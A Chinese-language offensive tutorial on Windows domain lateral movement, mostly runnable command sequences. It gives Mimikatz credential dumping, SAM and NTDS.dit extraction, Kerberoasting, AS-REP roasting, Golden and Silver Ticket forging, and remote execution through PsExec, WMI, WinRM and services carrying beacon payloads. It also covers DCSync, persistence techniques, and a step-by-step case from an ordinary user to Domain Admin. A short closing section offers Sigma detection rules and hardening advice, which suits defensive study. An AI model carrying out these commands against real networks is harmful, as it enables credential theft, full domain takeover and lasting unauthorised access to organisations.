# 内网横向渗透：Kerberos 与域内移动

---

## 📋 目录

1. [Windows 域环境基础](#一域环境基础)
2. [信息收集与域内侦察](#二域内侦察)
3. [凭据提取技术](#三凭据提取)
4. [Kerberos 攻击全解](#四kerberos-攻击)
5. [横向移动技术](#五横向移动)
6. [域控攻击与持久化](#六域控攻击)
7. [完整工具链实战](#七工具链实战)
8. [完整案例：从普通域用户到 Domain Admin](#八完整案例)
9. [防御与检测](#九防御与检测)
10. [排错指南](#十排错指南)

---

## 一、域环境基础

### 1.1 域架构

```
域环境三层结构：

  Domain Admins (域管理员)
       │
  ┌────┴────┐
  │ Domain Controller (域控) │
  │  ├── AD DS (目录服务)     │
  │  ├── Kerberos KDC (认证)  │
  │  ├── DNS (域名解析)       │
  │  └── NTDS.dit (凭据库)    │
  └────┬────┘
       │
  ┌────┴────────────────────┐
  │     Member Servers      │
  │  ├── File Server        │
  │  ├── SQL Server         │
  │  ├── Exchange           │
  │  └── Web Server         │
  └────┬────────────────────┘
       │
  ┌────┴────────────────────┐
  │     Workstations        │
  │   Windows 10/11 客户端   │
  └─────────────────────────┘

攻击目标路径：
  普通域用户 → 本地管理员 → 服务账户 → 域管理员 → 域控完全控制
```

### 1.2 Kerberos 认证流程

```
Kerberos 认证（三头狗模型）：

  客户端 ←→ KDC(密钥分发中心) ←→ 服务端

认证步骤：
  Step 1: AS-REQ (认证请求)
    客户端 → DC: "我是 user@domain.local，我想要 TGT"
    
  Step 2: AS-REP (认证响应)  
    DC → 客户端: 用 user 的 NTLM Hash 解密 → 获得 TGT
    TGT = 由 KRBTGT 账户 Hash 加密的会话密钥
    
  Step 3: TGS-REQ (服务票据请求)
    客户端 → DC: "我有 TGT，请给我访问 fileserver 的 ST(服务票据)"
    
  Step 4: TGS-REP (服务票据响应)
    DC → 客户端: 用服务账户的 Hash 加密的 ST
    
  Step 5: AP-REQ (服务访问)
    客户端 → fileserver: 使用 ST 进行认证

关键攻击点：
  ✦ AS-REP: 如果用户未启用预认证 → 可离线破解 TGT
  ✦ TGS-REP: 可离线破解 ST → Kerberoasting
  ✦ KRBTGT Hash: 可制作 Golden Ticket → 无限权限
```

---

## 二、域内侦察

### 2.1 初始信息收集

```powershell
# === 有了域内普通用户后的第一步 ===

# 1. 获取域基础信息
net config workstation                          # 域名、DC
nltest /dsgetdc:domain.local                    # DC 详情
[System.Net.Dns]::GetHostByAddress("10.0.1.5") # IP → 主机名

# 2. 获取域用户列表
net user /domain                                # 所有域用户
net group "Domain Admins" /domain               # 域管理组成员
net group "Enterprise Admins" /domain           # 企业管理员
net group "Domain Computers" /domain            # 所有计算机

# 3. 获取域管会话
# NetSessionEnum — 查询谁登录了哪台机器
net session \\DC01                               # 需要本地管理员
# 或使用 PowerView:
Find-DomainUserLocation                         # 查找域管登录的主机
Get-NetSession -ComputerName DC01               # 枚举会话

# 4. 查找域控
nltest /dclist:domain.local                     # DC 列表
Get-NetDomainController                         # PowerView 方法
```

### 2.2 BloodHound 域分析

```powershell
# === BloodHound 数据收集 ===
# SharpHound 是 BloodHound 的收集器

# 1. 收集所有域信息
SharpHound.exe -c All --zipfilename domain.zip

# 2. 会话收集（需要高权限）
SharpHound.exe -c Session --zipfilename sessions.zip

# 3. 把 ZIP 导入 BloodHound GUI 分析

# BloodHound 关键查询：
# "Find Shortest Paths to Domain Admins"
#   → 到 DA 的最短路径
#
# "Find Kerberoastable Users"  
#   → 可 Kerberoast 的用户
#
# "Find AS-REP Roastable Users"
#   → 无预认证用户
#
# "Find Principals with DCSync Rights"
#   → 谁有 DCSync 权限
```

### 2.3 PowerView 常用命令

```powershell
# PowerView 是 PowerSploit 框架的一部分
Import-Module .\PowerView.ps1

# 域信息
Get-NetDomain
Get-NetDomainController | select Name,IPAddress

# 用户
Get-NetUser | select samaccountname,description,memberof
Get-NetUser -SPN                          # 有 SPN 的用户(可 Kerberoast)
Get-NetUser -PreAuthNotRequired           # 无 Kerberos 预认证用户

# 组
Get-NetGroup "Domain Admins" | select member
Get-NetGroupMember "Domain Admins"        # DA 组成员

# 计算机
Get-NetComputer | select name,operatingsystem
Get-NetComputer -Ping                    # 在线计算机

# 共享
Find-DomainShare                         # 查找域共享

# GPO
Get-NetGPO | select displayname           # 所有 GPO

# ACL
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
# 谁对 DA 组有特殊权限？
```

---

## 三、凭据提取

### 3.1 Mimikatz 核心命令

```bash
# Mimikatz 使用（需要本地管理员 + 杀软关闭）
mimikatz.exe

# === 1. 提取登录凭据 ===
privilege::debug
sekurlsa::logonpasswords
# 输出: 域用户的 NTLM Hash + 明文密码(如果启用了 WDigest)

# === 2. 提取 Kerberos 票据 ===
sekurlsa::tickets /export
# 导出所有 .kirbi 票据文件到当前目录

# === 3. 提取 SAM 文件 ===
token::elevate
lsadump::sam
# 输出: 本地所有用户的 NTLM Hash

# === 4. DCSync（模拟 DC 同步密码）===
lsadump::dcsync /domain:domain.local /user:krbtgt
# 输出: KRBTGT 的 NTLM Hash — ★最重要！
# 拥有 KRBTGT Hash = 可以制作 Golden Ticket

lsadump::dcsync /domain:domain.local /all
# 导出所有用户的密码 Hash

# === 5. Pass-the-Ticket ===
kerberos::ptt ticket.kirbi
# 将 Kerberos 票据注入当前会话

# === 6. Overpass-the-Hash ===
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:<HASH> /run:powershell.exe
# 用 NTLM Hash 代替密码请求 TGT
```

### 3.2 SAM 和 NTDS.dit 提取

```bash
# === 提取本地 SAM ===
# 方法1: 注册表导出
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
# → 本地用 secretsdump 提取 Hash:
secretsdump.py -sam sam.hive -system system.hive LOCAL

# === 提取 NTDS.dit（域用户 Hash） ===
# 方法1: Volume Shadow Copy (VSS)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .
vssadmin delete shadows /all

# 方法2: Ntdsutil
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q

# 方法3: Impacket secretsdump（推荐，但需要高权限）
secretsdump.py domain.local/da_user:password@10.0.1.5 -just-dc-ntlm
# 直接从 DC 导出所有 NTLM Hash
```

---

## 四、Kerberos 攻击

### 4.1 Kerberoasting

```bash
# Kerberoasting = 向 DC 请求所有有 SPN 的用户的 TGS 票据
# → 用 hashcat 离线破解 → 获得服务账户密码

# ★原理：
# 任何域用户都可以请求有 SPN 的服务的 TGS 票据
# TGS 票据由服务账户的 NTLM Hash 加密
# → 导出后可用 hashcat 离线暴力破解

# === 攻击步骤 ===

# Step 1: 枚举有 SPN 的用户
Get-NetUser -SPN | select samaccountname,serviceprincipalname
# 或:
GetUserSPNs.py domain.local/user:password -request

# Step 2: 请求 TGS 票据（Impacket）
GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt
# 输出:
# $krb5tgs$23$*sqlsvc$DOMAIN.LOCAL$domain.local/sqlsvc*$abc123...

# Step 3: 破解 TGS
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt --force

# Step 4: 利用破解出的密码
# 服务账户通常有高权限！
# 尤其是 SQL/Exchange/IIS 等服务账户 → 可能有本地管理员权限
```

### 4.2 AS-REP Roasting

```bash
# AS-REP Roasting = 攻击不启用 Kerberos 预认证的用户
# 向 DC 发送 AS-REQ → DC 返回用用户 NTLM Hash 加密的 AS-REP
# → 离线破解获得用户密码

# ★前提：用户未启用 Kerberos 预认证
# (UserAccountControl 包含 DONT_REQ_PREAUTH 标志)

# Step 1: 枚举无预认证用户
Get-NetUser -PreAuthNotRequired

# Step 2: 请求 AS-REP
GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt

# Step 3: 破解
hashcat -m 18200 asrep.txt rockyou.txt
```

### 4.3 Golden Ticket（黄金票据）

```bash
# Golden Ticket = 用 KRBTGT Hash 伪造的 TGT
# 效果 = 可以冒充任何域用户访问任何服务 = 完全域控

# ★前提：已获得 KRBTGT 的 NTLM Hash（通过 DCSync）

# Step 1: 获取域 SID
whoami /user
# SID: S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX-500
# 域 SID = 去掉最后的 -500

# Step 2: 制作 Golden Ticket
mimikatz.exe
kerberos::golden /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /krbtgt:<KRBTGT_NTLM_HASH> \
  /user:Administrator \
  /id:500 \
  /groups:512,513,518,519,520 \
  /ticket:golden.kirbi

# 参数说明:
# /user    = 伪造的用户名
# /id 500  = Administrator 的 RID
# /groups  = 组 RID (512=DA, 513=DU, 518=Schema Admin, 519=Enterprise Admin)

# Step 3: 注入票据
kerberos::ptt golden.kirbi

# 现在可以:
# dir \\DC01\C$          → 访问 DC 文件
# psexec \\DC01 cmd.exe  → 在 DC 上执行命令
```

### 4.4 Silver Ticket（白银票据）

```bash
# Silver Ticket = 用服务账户 NTLM Hash 伪造的 TGS
# 效果 = 可以冒充任何用户访问特定服务
# 优势: 不与 DC 交互，更难检测

# Step 1: 获取服务账户 NTLM Hash
# (通过 Kerberoasting、DCSync、或 LSASS 提取)

# Step 2: 制作 Silver Ticket
mimikatz.exe
kerberos::golden /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:dc01.domain.local \
  /service:cifs \
  /rc4:<SERVICE_NTLM_HASH> \
  /user:Administrator \
  /id:500 \
  /ticket:silver.kirbi

# Step 3: 注入票据
kerberos::ptt silver.kirbi
# → 现在可以以 Administrator 身份访问 DC01 的文件共享
```

---

## 五、横向移动

### 5.1 PsExec 远程执行

```bash
# PsExec — 通过 SMB(445) 在远程主机执行命令

# 前提条件:
# 1. 目标主机开放 445 端口
# 2. 目标主机的 ADMIN$ 共享可访问
# 3. 拥有目标主机的管理员凭据

# === Sysinternals PsExec ===
PsExec.exe \\10.0.1.100 -u DOMAIN\admin -p password cmd.exe
PsExec.exe \\10.0.1.100 -s cmd.exe    # 以 SYSTEM 身份
PsExec.exe \\10.0.1.100 -c beacon.exe  # 上传+执行

# === Impacket psexec ===
psexec.py domain.local/admin:password@10.0.1.100
psexec.py -hashes :<NTLM_HASH> domain.local/admin@10.0.1.100  # Pass-the-Hash

# === Impacket smbexec（基于 SMB 服务）===
smbexec.py domain.local/admin:password@10.0.1.100
# 比 psexec 更隐蔽（不创建服务）

# === Impacket wmiexec（基于 WMI）===
wmiexec.py domain.local/admin:password@10.0.1.100
# 日志更少，更隐蔽
```

### 5.2 WMI 横向

```powershell
# WMI (Windows Management Instrumentation) 
# 使用 135 + 动态高端口

# === PowerShell 本地 WMI ===
# 在目标上创建进程
Invoke-WmiMethod -Class Win32_Process -Name Create `
  -ArgumentList "powershell.exe -enc <B64Payload>" `
  -ComputerName 10.0.1.100

# === wmic ===
wmic /node:10.0.1.100 /user:DOMAIN\admin /password:pass `
  process call create "cmd.exe /c whoami > C:\temp\out.txt"

# === Impacket wmiexec ===
wmiexec.py domain.local/admin:password@10.0.1.100
```

### 5.3 WinRM 横向

```powershell
# WinRM — 使用 5985(HTTP) / 5986(HTTPS)

# 前提：WinRM 在目标上启用
#   Enable-PSRemoting -Force

# === Enter-PSSession（交互式）===
$cred = Get-Credential DOMAIN\admin
Enter-PSSession -ComputerName 10.0.1.100 -Credential $cred

# === Invoke-Command（非交互式）===
Invoke-Command -ComputerName 10.0.1.100 `
  -ScriptBlock { whoami; hostname } `
  -Credential $cred

# === Linux evil-winrm ===
evil-winrm -i 10.0.1.100 -u admin -p password
evil-winrm -i 10.0.1.100 -u admin -H <NTLM_HASH>  # Pass-the-Hash
```

### 5.4 SMB / Net Use

```cmd
:: === 建立网络连接 ===
net use \\10.0.1.100\C$ password /user:DOMAIN\admin

:: === 复制文件 ===
copy beacon.exe \\10.0.1.100\C$\Windows\Temp\b.exe

:: === 创建服务执行 ===
sc \\10.0.1.100 create MyService binPath= "C:\Windows\Temp\b.exe" start= auto
sc \\10.0.1.100 start MyService
sc \\10.0.1.100 delete MyService

:: === 计划任务 ===
schtasks /create /s 10.0.1.100 /tn "Update" /tr "C:\Windows\Temp\b.exe" /sc once /st 00:00 /ru SYSTEM
schtasks /run /s 10.0.1.100 /tn "Update"
```

---

## 六、域控攻击与持久化

### 6.1 DCSync

```bash
# DCSync = 模拟 DC，从 DC 同步密码哈希
# 需要: Domain Admins / 具有 Replicating Directory Changes 权限

# === Mimikatz ===
mimikatz.exe
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all

# === Impacket secretsdump ===
secretsdump.py domain.local/da_user@10.0.1.5 -just-dc-ntlm
# 如果只需要 NTLM Hash（更快）

# === 检测 DCSync ===
# Event ID 4662: 执行了复制目录更改操作
# 非 DC 机器触发此事件 = 可疑的 DCSync
```

### 6.2 NTDS.dit Dump

```bash
# 直接从 DC 文件系统导出密码数据库

# === 方法1: Volume Shadow Copy ===
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# === 方法2: ntdsutil ===
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
# 在 c:\temp 下生成 Active Directory 的完整副本

# === 离线提取 Hash ===
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
# 输出所有域用户的 NTLM Hash
```

### 6.3 持久化

| 技术 | 命令 | 隐蔽性 |
|------|------|--------|
| Golden Ticket | `kerberos::golden ...` | 高（不接触DC） |
| Skeleton Key | 注入 DC 的 LSASS → 所有人可以用万能密码登录 | 中（重启后失效） |
| DSRM 密码 | 修改目录服务恢复模式密码 | 高（物理DC访问） |
| AdminSDHolder | 修改 ACL，每60分钟自动应用到所有受保护组 | 高 |
| WMI 事件订阅 | 创建永久 WMI 事件 → 触发执行 | 中 |
| DCShadow | 自注册为"伪 DC" → 注入篡改 | 高 |

---

## 七、工具链实战

### 7.1 Impacket 完整工作流

```bash
# Impacket = Python 实现的 Windows 协议工具集
# GitHub: https://github.com/fortra/impacket

# 1. 信息收集
GetADUsers.py domain.local/user:pass -dc-ip 10.0.1.5
GetUserSPNs.py domain.local/user:pass -dc-ip 10.0.1.5 -request

# 2. 横向移动（按优先级选择）
psexec.py domain.local/admin:pass@10.0.1.100       # 最常用
wmiexec.py domain.local/admin:pass@10.0.1.100      # 更隐蔽
smbexec.py domain.local/admin:pass@10.0.1.100      # 基于SMB
dcomexec.py domain.local/admin:pass@10.0.1.100     # 基于DCOM
atexec.py domain.local/admin:pass@10.0.1.100       # 计划任务

# 3. 凭据提取
secretsdump.py domain.local/admin:pass@10.0.1.5    # DCSync/Dump

# 4. Pass-the-Hash (所有工具都支持)
psexec.py -hashes :<NTLM_HASH> domain.local/admin@10.0.1.100

# 5. Pass-the-Ticket
export KRB5CCNAME=/path/to/ticket.ccache
psexec.py -k -no-pass domain.local/admin@10.0.1.100
```

### 7.2 CrackMapExec

```bash
# CME (CrackMapExec) = 红队瑞士军刀
# 支持 SMB/WinRM/MSSQL/SSH 等多种协议

# === SMB 扫描 ===
crackmapexec smb 10.0.1.0/24                        # 扫描在线主机
crackmapexec smb 10.0.1.0/24 --shares               # 枚举共享
crackmapexec smb 10.0.1.0/24 -u user -p pass         # 凭据验证
crackmapexec smb 10.0.1.0/24 -u user -H <NTLM_HASH> # Pass-the-Hash

# === 批量横向 ===
crackmapexec smb targets.txt -u admin -p pass -x whoami
# 在所有目标上执行 whoami

# === 凭据收集 ===
crackmapexec smb 10.0.1.5 -u admin -p pass --lsa     # dump LSA
crackmapexec smb 10.0.1.5 -u admin -p pass --sam     # dump SAM
crackmapexec smb 10.0.1.5 -u admin -p pass --ntds    # dump NTDS (需DA)

# === MSSQL ===
crackmapexec mssql 10.0.1.0/24 -u sa -p P@ssw0rd
crackmapexec mssql 10.0.1.0/24 -u sa -p pass -x "whoami"
# 通过 xp_cmdshell 执行命令
```

---

## 八、完整案例：从普通域用户到 DA

```
场景：获得域内一台 Windows 10 工作站的普通域用户 shell

===========================================================
Phase 1: 域信息收集 (20分钟)
===========================================================

步骤1: 确认域环境
  whoami → DOMAIN\zhangsan
  systeminfo → Windows 10 Enterprise, Domain: domain.local
  nltest /dsgetdc:domain.local → DC: DC01.domain.local (10.0.1.5)

步骤2: 枚举域用户和组
  net user /domain → 发现约500个域用户
  net group "Domain Admins" /domain → 只有5个DA

步骤3: BloodHound 分析
  SharpHound.exe -c All
  → 发现 DA 用户 "admin_svc" 登录过 WORKSTATION-25
  → 攻击路径: zhangsan → WORKSTATION-25 (本地管理员) → admin_svc (DA凭证)

===========================================================
Phase 2: 横向移动 (60分钟)
===========================================================

步骤4: 权限提升到本地管理员
  whoami /priv → 发现 SeImpersonatePrivilege
  JuicyPotato.exe -t * -p "C:\Windows\System32\cmd.exe" -l 1337
  → 获得 SYSTEM 权限!
  mimikatz → 提取 WORKSTATION-25 本地管理员 Hash

步骤5: 横向到 WORKSTATION-25
  psexec.py -hashes :<LOCAL_ADMIN_HASH> DOMAIN/Administrator@10.0.1.25
  → 成功! 获得 WORKSTATION-25 的 SYSTEM Shell

步骤6: 提取 DA 凭据
  mimikatz → 从 LSASS 中提取到 admin_svc 的 NTLM Hash
  → admin_svc 是 Domain Admin 组成员!

===========================================================
Phase 3: 拿下域控 (20分钟)
===========================================================

步骤7: 横向到 DC
  wmiexec.py -hashes :<ADMIN_SVC_HASH> DOMAIN/admin_svc@10.0.1.5
  → 获得 DC01 的 Shell (作为 DA)!

步骤8: 导出域凭据
  secretsdump.py -hashes :<ADMIN_SVC_HASH> DOMAIN/admin_svc@10.0.1.5
  → 导出所有 500 个用户的 NTLM Hash

步骤9: 持久化
  mimikatz → lsadump::dcsync /domain:domain.local /user:krbtgt
  → 获得 KRBTGT Hash
  → 制作 Golden Ticket
  → 即使密码被改，Golden Ticket 依然有效(有效期可设10年)

===========================================================
总结:
  初始: 普通域用户 zhangsan
  最终: 完全域控 + Golden Ticket 永久访问
  
  MTTD (攻击时间): 约 2小时
  
  关键失误:
    1. admin_svc (DA) 登录了普通工作站 → LSASS 凭证残留
    2. 工作站启用了 SeImpersonate → JuicyPotato 提权
    3. 无 EDR 告警 → 整个攻击链未被检测
```

---

## 九、防御与检测

### 9.1 攻击检测规则

```yaml
# Sigma 规则 — DCSync 检测
title: DCSync Attack Detection
id: detect-dcsync-001
status: stable
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    AccessMask: "0x100"
    Properties|contains: 
      - "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
      - "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2"
  filter_dc:
    SubjectLogonId|startswith: '0x3e7'  # 排除 DC 自身
  condition: selection and not filter_dc
level: critical
---
# Sigma — Golden Ticket 检测
title: Golden Ticket Detection
id: detect-golden-ticket-001
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4769
    TicketEncryptionType: "0x17"  # RC4 (Golden Ticket 通常用 RC4)
  condition: selection
  timeframe: 1h
level: high
```

### 9.2 防御措施

```
域安全加固清单：

☐ 启用 LAPS（本地管理员密码解决方案）
   → 每台机器的本地管理员密码唯一且定期轮换
   
☐ DA 账户登录限制
   → DA 只登录 DC，禁止登录工作站/成员服务器
   → 日常使用独立的管理员账户（非 DA 成员）

☐ Protected Users 组
   → 将 DA 加入 Protected Users 组
   → 禁用 NTLM 认证、禁用 Kerberos 委派、强制 AES 加密

☐ Credential Guard
   → 启用 Windows Defender Credential Guard
   → 使用虚拟化隔离 LSASS 进程

☐ 检测监控
   → 监控 Event ID 4662 (DCSync)
   → 监控 Event ID 4769 (异常 TGS 请求)
   → 部署 ATA (Advanced Threat Analytics) 或 MDI (Microsoft Defender for Identity)
```

---

## ✅ Checklist

**信息收集**
- [ ] 域基础信息（域名/DC/域控IP）
- [ ] 域用户和组枚举
- [ ] BloodHound 数据收集与分析
- [ ] 在线主机和共享扫描

**凭据提取**
- [ ] 本地凭据提取（Mimikatz/SAM）
- [ ] Kerberoasting
- [ ] AS-REP Roasting
- [ ] LSASS Dump

**横向移动**
- [ ] PsExec / WMI / WinRM 横向
- [ ] Pass-the-Hash / Pass-the-Ticket
- [ ] 批量扫描凭据有效性（CME）

**域控攻击**
- [ ] DCSync
- [ ] NTDS.dit dump
- [ ] Golden Ticket 制作
- [ ] 持久化
